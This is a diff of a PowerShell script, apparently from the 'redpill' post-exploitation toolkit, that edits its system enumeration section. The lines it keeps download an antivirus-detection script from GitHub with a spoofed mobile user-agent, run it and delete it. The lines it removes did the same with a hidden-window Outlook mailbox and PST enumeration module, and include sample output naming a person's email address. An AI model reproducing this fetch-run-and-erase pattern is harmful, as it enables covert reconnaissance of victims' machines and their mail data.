@@ -384,8 +384,7 @@ If($SysInfo -ieq "Enum" -or $SysInfo -ieq "Verbose"){
       iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetAvs.ps1" -OutFile "$Env:TMP\GetAvs.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
    }
 
-   &"$Env:TMP\GetAvs.ps1"
-   #powershell -WindowStyle Hidden -File "$Env:TMP\GetAvs.ps1"
+   &"$Env:TMP\GetAvs.ps1" -Action verbose
    Remove-Item -Path "$Env:TMP\GetAvs.ps1" -Force
 
 
@@ -435,37 +434,7 @@ If($SysInfo -ieq "Enum" -or $SysInfo -ieq "Verbose"){
        echo $GetACLDescription > $Env:TMP\ACl.log;Get-Content -Path "$Env:TMP\ACL.log"
        Remove-Item -Path "$Env:TMP\ACl.log" -Force
 
-
-    <#
-    .SYNOPSIS
-       Helper - Get-OutLookMailbox users
-
-   .OUTPUTS
-      Current profile has the following configured accounts:  
-  
-      Account Type           					User Name				SMTP Address  
-      ------------           					---------        		------------  
-      Jean-Marc.Albert-EXT@domain.com		Jean-Marc.ALBERT-EXT    Jean-Marc.Albert-EXT@domain.com  
-      
-      Exchange Offile Folder Store:  
-      C:\Users\9999912\AppData\Local\Microsoft\Outlook\Jean-Marc.Albert-EXT@domain.com.ost  
-     
-      PST Files  
-      Display Name    File Path   
-      ------------    ---------  
-      Archive Folders C:\Users\jean-marc.albert\AppData\Local\Microsoft\Outlook\archive.pst     
-   #>
-   
-   Write-Host "`nOFFICE: Mailbox Enumeration"
-   Write-Host "---------------------------";Start-Sleep -Seconds 1
-   If(-not(Test-Path -Path "$Env:TMP\List-AllMailboxAndPST.ps1" -EA SilentlyContinue)){
-      iwr -Uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/List-AllMailboxAndPST.ps1" -OutFile "$Env:TMP\List-AllMailboxAndPST.ps1" -UserAgent "Mozilla/5.0 (Android; Mobile; rv:40.0) Gecko/40.0 Firefox/40.0"
-   }
-
-   powershell -WindowStyle Hidden -File "$Env:TMP\List-AllMailboxAndPST.ps1"
-   Remove-Item -Path "$Env:TMP\List-AllMailboxAndPST.ps1" -Force
-
-   ## TobeContinued ..
+       ## TobeContinued ..
 
    }
    Write-Host "`n";Start-Sleep -Seconds 1
